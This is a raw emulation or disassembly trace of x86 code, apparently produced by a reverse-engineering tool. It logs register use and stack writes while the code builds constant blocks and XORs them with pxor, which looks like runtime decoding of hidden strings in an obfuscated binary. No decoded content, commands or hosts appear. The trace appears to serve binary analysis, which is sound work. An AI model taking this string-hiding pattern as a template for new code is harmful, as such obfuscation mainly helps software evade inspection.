regs_write: [30] 0x459a37: push -1, regs_read: [30], regs_write: [30] 0x459a39: push dword ptr [esp + 0x30], regs_read: [30], regs_write: [30] 0x459a43: push -1, regs_read: [30], regs_write: [30] 0x459a45: push dword ptr [esp + 0x2c], regs_read: [30], regs_write: [30] 0x459a4f: push -1, regs_read: [30], regs_write: [30] 0x459a51: push dword ptr [esp + 0x28], regs_read: [30], regs_write: [30] 0x459a5b: push -1, regs_read: [30], regs_write: [30] 0x459a5d: push dword ptr [esp + 0x38], regs_read: [30], regs_write: [30] 0x459a67: push -1, regs_read: [30], regs_write: [30] 0x459a69: push edi, regs_read: [30, 23], regs_write: [30] 0x459a6a: mov edi, dword ptr [0x4c81a4], regs_read: (), regs_write: [23] 0x459a72: push -1, regs_read: [30], regs_write: [30] 0x459a74: push esi, regs_read: [30, 29], regs_write: [30] 0x459a77: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x459a7c: mov dword ptr [esp + 0x110], 0x368692e8, regs_read: [30], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8110 for stack size 0x10000 saving data to stack: 914789096 4 0x459a87: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x459a8c: mov dword ptr [esp + 0x14], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x459a90: mov edi, 0x52cae095, regs_read: (), regs_write: [23] 0x459a95: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x459a99: mov edx, 0x368692b7, regs_read: (), regs_write: [24] 0x459a9e: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x459aa2: mov dword ptr [esp + 0x10], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x459aa6: mov esi, 0x46efe899, regs_read: (), regs_write: [29] 0x459aab: movaps xmm1, xmmword ptr [esp + 0x10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1e8 and offset 0x8010 for stack size 0x10000 0x459ab0: mov dword ptr [esp + 0x128], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8128 for stack size 0x10000 saving data to stack: 929680980 4 0x459ab7: mov dword ptr [esp + 0x124], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8124 for stack size 0x10000 saving data to stack: 896093928 4 0x459abe: mov dword ptr [esp + 0x118], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8118 for stack size 0x10000 saving data to stack: 929680980 4 0x459ac5: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x459acd: mov dword ptr [esp + 0x120], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8120 for stack size 0x10000 saving data to stack: 1190127769 4 0x459ad4: mov dword ptr [esp + 0x12c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x459adb: pxor xmm1, xmmword ptr [esp + 0x120], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1e8 and offset 0x8120 for stack size 0x10000 0x459ae4: mov dword ptr [esp + 0x114], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8114 for stack size 0x10000 saving data to stack: 896093928 4 0x459aeb: movaps xmmword ptr [esp + 0x120], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8120 for stack size 0x10000 saving data to stack: 1885960750 16 0x459af3: mov dword ptr [esp + 0x11c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x459afa: movaps xmm1, xmmword ptr [esp + 0x110], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1e8 and offset 0x8110 for stack size 0x10000 0x459b02: mov dword ptr [esp + 0x10], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x459b0d: mov dword ptr [esp + 0x14], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x459b18: push eax, regs_read: [30, 19], regs_write: [30] 0x459b19: mov dword ptr [esp + 0x20], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x1ec and offset 0x8020 for stack size 0x10000 saving data to stack: 1389027477 4 0x459b24: pxor xmm1, xmmword ptr [esp + 0x14], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1ec and offset 0x8014 for stack size 0x10000 0x459b2a: push eax, regs_read: [30, 19], regs_write: [30] 0x459b2b: movaps xmmword ptr [esp + 0x118], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1f0 and offset 0x8118 for stack size 0x10000 saving data to stack: 95 16 0x459b38: pop ecx, regs_read: [30], regs_write: [30, 22] 0x459b39: mov edx, eax, regs_read: [19], regs_write: [24] 0x459b47: pop ecx, regs_read: [30], regs_write: [30, 22] 0x459b4f: mov edx, eax, regs_read: [19], regs_write: [24] 0x459b51: push ecx, regs_read: [30, 22], regs_write: [30] 0x459b5e: pop ecx, regs_read: [30], regs_write: [30, 22] 0x459b77: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x459b7c: mov dword ptr [esp + 0x130], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8130 for stack size 0x10000 saving data to stack: 1190127769 4 0x459b83: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x459b88: mov dword ptr [esp + 0x134], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8134 for stack size 0x10000 saving data to stack: 896093928 4 0x459b8f: mov dword ptr [esp + 0x138], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8138 for stack size 0x10000 saving data to stack: 929680980 4 0x459b96: mov dword ptr [esp + 0x13c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x813c for stack size 0x10000 saving data to stack: 1389027477 4 0x459b9d: movaps xmm1, xmmword ptr [esp + 0x130], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1e8 and offset 0x8130 for stack size 0x10000 0x459ba5: mov dword ptr [esp + 0x14], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x459bb0: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x459bb4: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x459bbc: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x459bc0: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1e8 and offset 0x8010 for stack size 0x10000 0x459bc6: push 0x20, regs_read: [30], regs_write: [30] 0x459bc8: pop edx, regs_read: [30], regs_write: [30, 24] 0x459bc9: movaps xmmword ptr [esp + 0x130], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x8130 for stack size 0x10000 saving data to stack: 1885960750 16 0x459bd6: push eax, regs_read: [30, 19], regs_write: [30] 0x459bea: pop ecx, regs_read: [30], regs_write: [30, 22] 0x459bf2: mov edx, eax, regs_read: [19], regs_write: [24] 0x459bf4: push ecx, regs_read: [30, 22], regs_write: [30] 0x459c01: pop ecx, regs_read: [30], regs_write: [30, 22] 0x459c1a: mov ecx, 0x4f07dc, regs_read: (), regs_write: [22] 0x459c2e: mov edi, eax, regs_read: [19], regs_write: [23] 0x459c30: mov esi, esp, regs_read: [30], regs_write: [29] adjusting stack for ESP -0x1e8 and offset 0x8000 for stack size 0x10000 0x459c37: push eax, regs_read: [30, 19], regs_write: [30] 0x459c38: mov ecx, esi, regs_read: [29], regs_write: [22] 0x459c42: mov esi, 0x4f05f0, regs_read: (), regs_write: [29] 0x459c47: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x1ec and offset 0x8000 for stack size 0x10000 0x459c49: push esi, regs_read: [30, 29], regs_write: [30] 0x459c4f: mov ecx, edi, regs_read: [23], regs_write: [22] 0x459c60: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x1f0 and offset 0x8000 for stack size 0x10000 0x459c62: push eax, regs_read: [30, 19], regs_write: [30] 0x459c72: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x1f4 and offset 0x8000 for stack size 0x10000 0x459c74: push eax, regs_read: [30, 19], regs_write: [30] 0x459c8e: push eax, regs_read: [30, 19], regs_write: [30] 0x459c95: push ecx, regs_read: [30, 22], regs_write: [30] 0x459c96: mov ecx, esi, regs_read: [29], regs_write: [22] 0x459ca7: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x200 and offset 0x8000 for stack size 0x10000 0x459ca9: push eax, regs_read: [30, 19], regs_write: [30] 0x459cb2: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x204 and offset 0x8000 for stack size 0x10000 0x459cb4: push 0x4f0778, regs_read: [30], regs_write: [30] 0x459cc1: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x208 and offset 0x8000 for stack size 0x10000 0x459cc3: push 0x4f05e0, regs_read: [30], regs_write: [30] 0x459cd0: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x20c and offset 0x8000 for stack size 0x10000 0x459cd2: push 0x4f0720, regs_read: [30], regs_write: [30] 0x459cdf: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x210 and offset 0x8000 for stack size 0x10000 0x459ce1: push 0x4f0740, regs_read: [30], regs_write: [30] 0x459cee: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x214 and offset 0x8000 for stack size 0x10000 0x459cf0: push 0x4f0730, regs_read: [30], regs_write: [30] 0x459cfd: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x218 and offset 0x8000 for stack size 0x10000 0x459cff: push 0x4f0618, regs_read: [30], regs_write: [30] 0x459d13: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x21c and offset 0x8000 for stack size 0x10000 0x459d15: push eax, regs_read: [30, 19], regs_write: [30] 0x459d5f: push 2, regs_read: [30], regs_write: [30] 0x459d61: push dword ptr [0x4ebb48], regs_read: [30], regs_write: [30] 0x459d6d: push dword ptr [0x4ebb48], regs_read: [30], regs_write: [30] 0x459d7f: push 0, regs_read: [30], regs_write: [30] 0x459d88: push ebp, regs_read: [30, 20], regs_write: [30] 0x459d89: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x234 and offset 0x8000 for stack size 0x10000 0x459d98: push esi, regs_read: [30, 29], regs_write: [30] 0x459d99: push edi, regs_read: [30, 23], regs_write: [30] 0x459d9a: mov esi, 0x3769ce54, regs_read: (), regs_write: [29] 0x459d9f: mov edi, 0x52cae095, regs_read: (), regs_write: [23] 0x459daa: mov dword ptr [esp + 0x10], 0x44e5e1eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x23c and offset 0x8010 for stack size 0x10000 saving data to stack: 1155916267 4 0x459db6: mov dword ptr [esp + 0x14], 0x46072b8d, regs_read: [30], regs_write: () adjusting stack for ESP -0x23c and offset 0x8014 for stack size 0x10000 saving data to stack: 1174875021 4 0x459dc2: mov dword ptr [esp + 0x18], 0x191da13c, regs_read: [30], regs_write: () adjusting stack for ESP -0x23c and offset 0x8018 for stack size 0x10000 saving data to stack: 421372220 4 0x459dca: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x459dcf: mov dword ptr [esp + 0x1c], 0x52ad8ee5, regs_read: [30], regs_write: () adjusting stack for ESP -0x23c and offset 0x801c for stack size 0x10000 saving data to stack: 1387106021 4 0x459dd7: mov dword ptr [esp + 0x30], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x23c and offset 0x8030 for stack size 0x10000 saving data to stack: 914789047 4 0x459ddf: mov dword ptr [esp + 0x34], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x23c and offset 0x8034 for stack size 0x10000 saving data to stack: 896093928 4 0x459de7: mov dword ptr [esp + 0x38], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x23c and offset 0x8038 for stack size 0x10000 saving data to stack: 929680980 4 0x459deb: mov dword ptr [esp + 0x3c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x23c and offset 0x803c for stack size 0x10000 saving data to stack: 1389027477 4 0x459def: movaps xmm1, xmmword ptr [esp + 0x10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x23c and offset 0x8010 for stack size 0x10000 0x459df4: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x23c and offset 0x8030 for stack size 0x10000 0x459dfa: push eax, regs_read: [30, 19], regs_write: [30] 0x459dfb: movaps xmmword ptr [esp + 0x14], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x240 and offset 0x8014 for stack size 0x10000 saving data to stack: 537046529416762483406935186676609884 16 0x459e0e: mov eax, dword ptr [esp + 0x44], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x240 and offset 0x8044 for stack size 0x10000 0x459e27: push eax, regs_read: [30, 19], regs_write: [30] 0x459e28: push ecx, regs_read: [30, 22], regs_write: [30] 0x459e38: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x459e3a: push ecx, regs_read: [30, 22], regs_write: [30] 0x459e3b: mov ecx, eax, regs_read: [19], regs_write: [22] 0x459e42: pop ecx, regs_read: [30], regs_write: [30, 22] 0x459e55: mov dword ptr [esp + 0x10], 0x5aefd4eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x248 and offset 0x8010 for stack size 0x10000 saving data to stack: 1525667051 4 0x459e61: mov dword ptr [esp + 0x14], 0x35693d8d, regs_read: [30], regs_write: () adjusting stack for ESP -0x248 and offset 0x8014 for stack size 0x10000 saving data to stack: 896089485 4 0x459e6d: mov dword ptr [esp + 0x18], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x248 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x459e71: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x459e76: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x248 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x459e7a: movaps xmm1, xmmword ptr [esp + 0x10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x248 and offset 0x8010 for stack size 0x10000 0x459e7f: mov dword ptr [esp + 0x30], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x248 and offset 0x8030 for stack size 0x10000 saving data to stack: 914789047 4 0x459e87: mov dword ptr [esp + 0x34], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x248 and offset 0x8034 for stack size 0x10000 saving data to stack: 896093928 4 0x459e8f: mov dword ptr [esp + 0x38], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x248 and offset 0x8038 for stack size 0x10000 saving data to stack: 929680980 4 0x459e93: mov dword ptr [esp + 0x3c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x248 and offset 0x803c for stack size 0x10000 saving data to stack: 1389027477 4 0x459e97: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x248 and offset 0x8030 for stack size 0x10000 0x459e9d: push eax, regs_read: [30, 19], regs_write: [30] 0x459e9e: movaps xmmword ptr [esp + 0x14], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x24c and offset 0x8014 for stack size 0x10000 saving data to stack: 126879447729756 16 0x459eaf: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x24c and offset 0x8000 for stack size 0x10000 0x459eb1: push eax, regs_read: [30, 19], regs_write: [30] 0x459ec8: pop edi, regs_read: [30], regs_write: [30, 23] 0x459ecb: pop esi, regs_read: [30], regs_write: [30, 29] 0x459ecc: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x248 and offset 0x8000 for stack size 0x10000 0x459ece: pop ebp, regs_read: [30], regs_write: [30, 20] 0x459ed0: push ebp, regs_read: [30, 20], regs_write: [30] 0x459ed1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x459edc: push esi, regs_read: [30, 29], regs_write: [30] 0x459edd: mov esi, 0x52cae095, regs_read: (), regs_write: [29] 0x459ee2: mov dword ptr [esp + 0x3c], 0x5aefd4eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x803c for stack size 0x10000 saving data to stack: 1525667051 4 0x459eea: mov dword ptr [esp + 0x40], 0x5900148d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8040 for stack size 0x10000 saving data to stack: 1493177485 4 0x459ef6: mov dword ptr [esp + 0x44], 0x3769af38, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8044 for stack size 0x10000 saving data to stack: 929673016 4 0x459f05: mov dword ptr [esp + 0x48], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x4 and offset 0x8048 for stack size 0x10000 saving data to stack: 1389027477 4 0x459f09: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x459f0e: mov dword ptr [esp + 0xc], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x800c for stack size 0x10000 saving data to stack: 914789047 4 0x459f16: mov dword ptr [esp + 0x10], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8010 for stack size 0x10000 saving data to stack: 896093928 4 0x459f1e: mov dword ptr [esp + 0x14], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8014 for stack size 0x10000 saving data to stack: 929680980 4 0x459f26: mov dword ptr [esp + 0x18], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x4 and offset 0x8018 for stack size 0x10000 saving data to stack: 1389027477 4 0x459f2a: movaps xmm1, xmmword ptr [esp + 0xc], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x800c for stack size 0x10000 0x459f2f: pxor xmm1, xmmword ptr [esp + 0x3c], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x803c for stack size 0x10000 0x459f35: push edi, regs_read: [30, 23], regs_write: [30] 0x459f36: push eax, regs_read: [30, 19], regs_write: [30] 0x459f37: movaps xmmword ptr [esp + 0x44], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x8044 for stack size 0x10000 saving data to stack: 460069609072736525174364 16 0x459f50: mov edi, dword ptr [0x4c80d4], regs_read: (), regs_write: [23] 0x459f5e: pop ecx, regs_read: [30], regs_write: [30, 22] 0x459f5f: push 0, regs_read: [30], regs_write: [30] 0x459f61: push eax, regs_read: [30, 19], regs_write: [30] 0x459f6c: push 0x104, regs_read: [30], regs_write: [30] 0x459f78: push 0, regs_read: [30], regs_write: [30] 0x459f7a: push eax, regs_read: [30, 19], regs_write: [30] 0x459f8a: push eax, regs_read: [30, 19], regs_write: [30] 0x459f8d: push eax, regs_read: [30, 19], regs_write: [30] 0x459f8e: push eax, regs_read: [30, 19], regs_write: [30] 0x459f8f: push 0x1a, regs_read: [30], regs_write: [30] 0x459f91: push eax, regs_read: [30, 19], regs_write: [30] 0x459f98: mov dword ptr [esp + 0x40], 0x5aefd4eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x30 and offset 0x8040 for stack size 0x10000 saving data to stack: 1525667051 4 0x459fa4: mov dword ptr [esp + 0x44], 0x5900148d, regs_read: [30], regs_write: () adjusting stack for ESP -0x30 and offset 0x8044 for stack size 0x10000 saving data to stack: 1493177485 4 0x459fb3: mov dword ptr [esp + 0x48], 0x3769af38, regs_read: [30], regs_write: () adjusting stack for ESP -0x30 and offset 0x8048 for stack size 0x10000 saving data to stack: 929673016 4 0x459fbb: mov dword ptr [esp + 0x4c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x30 and offset 0x804c for stack size 0x10000 saving data to stack: 1389027477 4 0x459fbf: movaps xmm1, xmmword ptr [esp + 0x40], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x30 and offset 0x8040 for stack size 0x10000 0x459fc4: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x30 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x459fcc: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x30 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x459fd4: mov dword ptr [esp + 0x18], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x30 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x459fdc: mov dword ptr [esp + 0x1c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x30 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x459fe0: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x30 and offset 0x8010 for stack size 0x10000 0x459fe6: push eax, regs_read: [30, 19], regs_write: [30] 0x459fe7: movaps xmmword ptr [esp + 0x44], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x34 and offset 0x8044 for stack size 0x10000 saving data to stack: 460069609072736525174364 16 0x459ff8: mov edx, eax, regs_read: [19], regs_write: [24] 0x459ffd: mov al, byte ptr [ecx], regs_read: [22], regs_write: [2] 0x45a00d: push ecx, regs_read: [30, 22], regs_write: [30] 0x45a00e: push eax, regs_read: [30, 19], regs_write: [30] 0x45a00f: push ecx, regs_read: [30, 22], regs_write: [30] 0x45a010: mov ecx, edx, regs_read: [24], regs_write: [22] 0x45a017: push eax, regs_read: [30, 19], regs_write: [30] 0x45a05a: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x8000 for stack size 0x10000 0x45a05c: push eax, regs_read: [30, 19], regs_write: [30] 0x45a06c: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x48 and offset 0x8000 for stack size 0x10000 0x45a06e: push eax, regs_read: [30, 19], regs_write: [30] 0x45a082: push ecx, regs_read: [30, 22], regs_write: [30] 0x45a08f: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45a09c: mov esi, 0x52cae095, regs_read: (), regs_write: [29] 0x45a0a1: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45a0a6: mov dword ptr [esp + 0x40], 0x43eac2eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8040 for stack size 0x10000 saving data to stack: 1139458795 4 0x45a0ae: mov dword ptr [esp + 0x48], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x4c and offset 0x8048 for stack size 0x10000 saving data to stack: 929680980 4 0x45a0b9: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x4c and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45a0bd: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x45a0c2: mov dword ptr [esp + 0x44], 0x4607278f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8044 for stack size 0x10000 saving data to stack: 1174873999 4 0x45a0ce: mov dword ptr [esp + 0x4c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x4c and offset 0x804c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a0d2: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x45a0da: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x45a0e2: mov dword ptr [esp + 0x1c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x4c and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a0e6: movaps xmm1, xmmword ptr [esp + 0x10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4c and offset 0x8010 for stack size 0x10000 0x45a0eb: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4c and offset 0x8040 for stack size 0x10000 0x45a0f1: push eax, regs_read: [30, 19], regs_write: [30] 0x45a0f2: movaps xmmword ptr [esp + 0x44], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x50 and offset 0x8044 for stack size 0x10000 saving data to stack: 8317701454872465500 16 0x45a10b: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45a114: push 0, regs_read: [30], regs_write: [30] 0x45a116: push eax, regs_read: [30, 19], regs_write: [30] 0x45a119: mov dword ptr [esp + 0x54], 0x64, regs_read: [30], regs_write: () adjusting stack for ESP -0x54 and offset 0x8054 for stack size 0x10000 saving data to stack: 100 4 0x45a129: mov eax, dword ptr [0x4f062c], regs_read: (), regs_write: [19] 0x45a130: mov ecx, dword ptr [0x4f0628], regs_read: (), regs_write: [22] 0x45a138: mov dword ptr [esp + 0xc], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x54 and offset 0x800c for stack size 0x10000 saving data to stack: 5178864 4 0x45a141: mov byte ptr [esp + 9], 0, regs_read: [30], regs_write: () adjusting stack for ESP -0x54 and offset 0x8009 for stack size 0x10000 saving data to stack: 0 1 0x45a14e: mov dword ptr [esp + 0xfc], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x54 and offset 0x80fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45a157: mov dword ptr [esp + 0xf0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x54 and offset 0x80f0 for stack size 0x10000 saving data to stack: 914789047 4 0x45a162: mov dword ptr [esp + 0xf4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x54 and offset 0x80f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45a16d: mov dword ptr [esp + 0xf8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x54 and offset 0x80f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45a178: mov dword ptr [esp + 0x50], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x54 and offset 0x8050 for stack size 0x10000 saving data to stack: 1389027477 4 0x45a188: push eax, regs_read: [30, 19], regs_write: [30] 0x45a18e: mov eax, dword ptr [0x4f0628], regs_read: (), regs_write: [19] 0x45a19f: push eax, regs_read: [30, 19], regs_write: [30] 0x45a1a5: mov eax, dword ptr [0x4f0628], regs_read: (), regs_write: [19] 0x45a1b6: push eax, regs_read: [30, 19], regs_write: [30] 0x45a1bc: mov eax, dword ptr [0x4f0628], regs_read: (), regs_write: [19] 0x45a1cd: push eax, regs_read: [30, 19], regs_write: [30] 0x45a1d3: mov eax, dword ptr [0x4f0628], regs_read: (), regs_write: [19] 0x45a1df: mov dword ptr [esp + 0x40], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x8040 for stack size 0x10000 saving data to stack: 914789099 4 0x45a1e7: mov dword ptr [esp + 0x44], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x8044 for stack size 0x10000 saving data to stack: 896093928 4 0x45a1ef: mov dword ptr [esp + 0x48], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x8048 for stack size 0x10000 saving data to stack: 929680980 4 0x45a1f7: mov cl, byte ptr [esi + eax + 1], regs_read: [29, 19], regs_write: [10] 0x45a1fb: mov al, byte ptr [esi + eax], regs_read: [29, 19], regs_write: [2] 0x45a1fe: mov dword ptr [esp + 0x4c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x804c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a206: movaps xmm0, xmmword ptr [esp + 0x40], regs_read: [30], regs_write: [122] adjusting stack for ESP -0x64 and offset 0x8040 for stack size 0x10000 0x45a20b: pxor xmm0, xmmword ptr [esp + 0xf0], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP -0x64 and offset 0x80f0 for stack size 0x10000 0x45a214: mov byte ptr [esp + 0xa], al, regs_read: [30, 2], regs_write: () adjusting stack for ESP -0x64 and offset 0x800a for stack size 0x10000 saving data to stack: 1 1 0x45a21c: mov byte ptr [esp + 0xb], cl, regs_read: [30, 10], regs_write: () adjusting stack for ESP -0x64 and offset 0x800b for stack size 0x10000 saving data to stack: 0 